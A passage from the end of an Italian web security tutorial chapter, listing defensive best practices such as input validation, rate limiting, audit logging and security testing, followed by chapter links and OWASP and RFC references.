6. ✅ Input validation + Output encoding SEMPRE
7. ✅ Rate limiting su TUTTI gli endpoint sensibili
8. ✅ Log security events (audit trail)
9. ✅ Dependency scanning (vulnerabilità note)
10. ✅ Security testing (SAST + DAST + pentest)
```

---

## 🔗 Collegamenti

- **Precedente**: [Capitolo 23 - Password Security](23_password_security.md)
- **Successivo**: [Capitolo 25 - Crittografia nel Database](25_crittografia_nel_database.md)
- **Indice**: [Torna all'indice](../00_INDICE.md)

---

## 📚 Riferimenti

- OWASP Top 10
- OWASP Web Security Testing Guide
- RFC 6749: OAuth 2.0
- RFC 7519: JWT
- Mozilla Web Security Guidelines

**Nota**: La sicurezza web è multilivello! Ogni layer deve essere protetto.
